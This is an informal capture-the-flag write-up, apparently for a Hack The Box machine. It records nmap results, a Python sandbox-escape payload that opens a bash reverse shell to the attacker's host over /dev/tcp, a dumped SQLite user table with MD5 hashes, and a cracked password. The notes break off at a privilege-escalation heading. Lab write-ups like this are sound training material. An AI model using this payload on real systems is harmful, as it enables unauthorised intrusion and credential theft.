10.10.11.62


[haxor@skid ~]$ nmap -sC -sV 10.10.11.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-29 17:36 UTC
Nmap scan report for 10.10.11.62
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel






https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/


This is intresting but kinda long


At port :5000 there is a gunicorn server that is a Python Web IDE, but it filters stuff like 'OS', 'SYSTEM' and anything else you can use to execute system commands.

So this combined with https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/ we will be able to bypass this filter and get a reverse shell



I use

```
().__class__.__base__.__subclasses__()[317](["/bin/bash", "-c", "ls; bash -i >& /dev/tcp/10.10.14.10/4445 0>&1"])

```

To get a reverse shell. 



then stablize

h


```

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1233/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```



then Inside the app 

i  go to the instance and get the database.db


then download it to my home machine


sqlite> SELECT * FROM user
   ...> ;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be

I crack martins hash which is md5.
martin : nafeelswordsmaster

## **🔍 Step 1: Enumeration**

### **1️⃣ Scanned the Target for Sudo Privileges**

We ran:


